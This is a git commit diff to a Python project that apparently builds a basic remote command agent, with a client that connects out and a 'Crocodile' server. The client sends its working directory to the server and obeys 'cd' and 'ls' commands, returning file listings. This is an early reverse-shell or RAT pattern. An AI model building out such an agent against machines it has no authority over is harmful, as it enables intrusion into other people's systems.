488e2898a4b4ac41332610ae27f6acb9d2f3e3f2
JesusJs <jdchavezzss@gmail.com>
2025-02-23 19:29:19 -0500

    Implementando metodo para acceder a archivos.

--- core/agents/client.py
+++ core/agents/client.py
@@ -16,20 +16,40 @@ class AsyncClient:
 
     async def connect(self):
         reader, writer = await asyncio.open_connection(self.host, self.port)
+        # if writer.transport.is_closing:
+        #     current_dir = os.getcwd()
+        #     res_dir = current_dir.encode("utf-8")
+        #     print(res_dir)
+        #     writer.write(res_dir)  
+        #     data = await reader.read(1024)
+        current_dir = os.getcwd()
+        res_dir = current_dir.encode("utf-8")
+        print(res_dir)
+        writer.write(res_dir)  
         while True:
             try:
-                data = await reader.read(36)
-                command = data.decode().strip()
+                data = await reader.read(1024)
+                command = data.decode()
                 print(f"Comando recibido: {command}")
                 if command.startswith("cd "):
-                    path = command[3:].strip()
-
+                    path = command[3:]
                     if os.path.exists(path) and os.path.isdir(path):
                         os.chdir(path)
-                        current_dir = os.getcwd()
-                    
-                    writer.write(current_dir.encode('utf-8'))
-                    await writer.drain()  # Enviar los datos
+                        current_dir = os.getcwd()     
+                        writer.write(current_dir.encode('utf-8'))
+                        await writer.drain()  # Enviar los datos
+                        print(current_dir)
+                elif command.startswith("ls") or command.startswith("dir"):
+                        path = os.getcwd() 
+                        dir_list = ""
+                        p =  os.listdir(path) 
+                        if p != []:               
+                            for command in os.listdir(path):
+                                if command != 0:
+                                    dir_list += command + '\n'
+                        else:
+                            dir_list = "No Result."
+                        writer.write(dir_list.encode('utf-8'))
                 else:
                      writer.write(b"Comando incorrecto.")
 
--- core/server/commands/command.py
+++ core/server/commands/command.py
@@ -14,19 +14,38 @@ class Crocodile:
     async def start(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         if not isinstance(reader, asyncio.StreamReader):
             raise TypeError("reader debe ser una instancia de asyncio.StreamReader")
+        current_dir = await reader.read(1024)
+        count = 0
         while True:
             try: 
-                command =  await self.get_input("#>: ")
+                if isinstance(current_dir, bytes):
+                    command = await self.get_input(current_dir.decode() + '#:')
+                elif isinstance(current_dir, str):
+                    command = await self.get_input(current_dir + '#:')
+                else:
+                    raise TypeError("current_dir debe ser de tipo bytes o str")
                 if command.lower() == "exit":
                     break
-                r = command.encode('utf-8')
-                writer.write(r)
-                resp = await reader.read(36)
+                elif command.startswith("cd"):
+                    # writer.write(command.encode('utf-8'))
+                    # res = await reader.read(36)           
+                    # current_dir = res
+                    r = command.encode('utf-8')
+                    writer.write(r)
+                    resp = await reader.read(1024)
+                    current_dir = resp.decode()
+                    print(current_dir)
+                else:
+                    res= command.encode('utf-8')
+                    writer.write(res)
+                    resp = await reader.read(1024)
+                    current_dir = resp
+                    print(current_dir)
                 if not resp:
                     print("🔴 El cliente cerró la conexión.")
                     break
                     
-                print("Respuesta recibida:", resp.decode("utf-8", errors="replace"))
+                print("Respuesta recibida:", resp.decode())
             except Exception as e:
                 print("ocurrio un error", e)
                 if( str(e).find("El nombre de red especificado ya no está disponible")):
